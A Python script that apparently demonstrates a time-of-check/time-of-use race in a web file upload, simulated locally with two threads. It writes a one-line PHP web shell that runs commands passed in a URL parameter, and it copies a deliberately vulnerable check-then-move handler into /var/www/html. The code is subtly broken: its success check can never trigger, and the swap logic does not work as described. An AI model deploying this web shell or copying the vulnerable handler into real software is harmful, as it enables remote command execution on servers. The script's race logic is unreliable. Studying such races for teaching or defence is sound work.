#!/usr/bin/env python3
# TOCTOU File Upload Race
# Simulates: check filename/extension â†’ move to final location
# Classic web app upload vulnerability

import os
import threading
import time
import requests

UPLOAD_URL = "http://localhost:5000/upload"  # Modify if needed
SAFE_DIR = "/tmp/uploads_safe"
FINAL_DIR = "/var/www/html"

os.makedirs(SAFE_DIR, exist_ok=True)
os.makedirs(FINAL_DIR, exist_ok=True)

def vulnerable_upload_handler():
    """Simulates web app processing uploads"""
    while True:
        for file in os.listdir(SAFE_DIR):
            filepath = os.path.join(SAFE_DIR, file)
            # TOCTOU check: only allow .jpg
            if file.endswith(".jpg"):
                try:
                    # Race window before move
                    time.sleep(0.05)
                    os.rename(filepath, os.path.join(FINAL_DIR, file))
                    if file == "shell.php":
                        print(f"[!] WEB SHELL UPLOADED! Access at /shell.php")
                        break
                except:
                    pass
        time.sleep(0.1)

def race_uploader():
    """Rapidly swaps file during processing"""
    legit = os.path.join(SAFE_DIR, "photo.jpg")
    malicious = os.path.join(SAFE_DIR, "shell.php")
    
    # Create malicious shell
    with open(malicious, 'w') as f:
        f.write("<?php system($_GET['cmd']); ?>")
    
    for _ in range(100):
        # Upload legit first
        open(legit, 'w').close()
        time.sleep(0.01)
        
        # Swap during race
        try:
            os.rename(malicious, legit)
        except:
            pass
        
        time.sleep(0.01)
        
        # Recreate for next cycle
        open(malicious, 'w').close()

print("[*] Starting TOCTOU file upload race...")
threading.Thread(target=vulnerable_upload_handler, daemon=True).start()
threading.Thread(target=race_uploader).start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[+] Exploit stopped")
